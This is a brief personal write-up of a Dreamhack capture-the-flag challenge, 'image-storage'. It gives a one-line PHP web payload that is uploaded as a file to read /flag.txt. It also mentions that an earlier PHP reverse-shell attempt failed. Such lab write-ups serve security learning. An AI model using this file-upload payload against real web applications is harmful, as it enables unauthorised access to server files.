---
created: 2026-11-12
tags:
  - note
  - journal
  - cyberStuff
  - dreamhack
title: Dreamhack > image-storage
date: 2026-11-12T10:00:35.741Z
lastmod: 2026-11-12T10:38:07.313Z
---
link :https://dreamhack.io/wargame/challenges/38

just upload a php file with the content :

```php
<?php echo file_get_contents('/flag.txt'); ?>
```

then access it via list page\
in my first try i overcomplicated things using a php rev shell and it did not work probably because of some security filters.
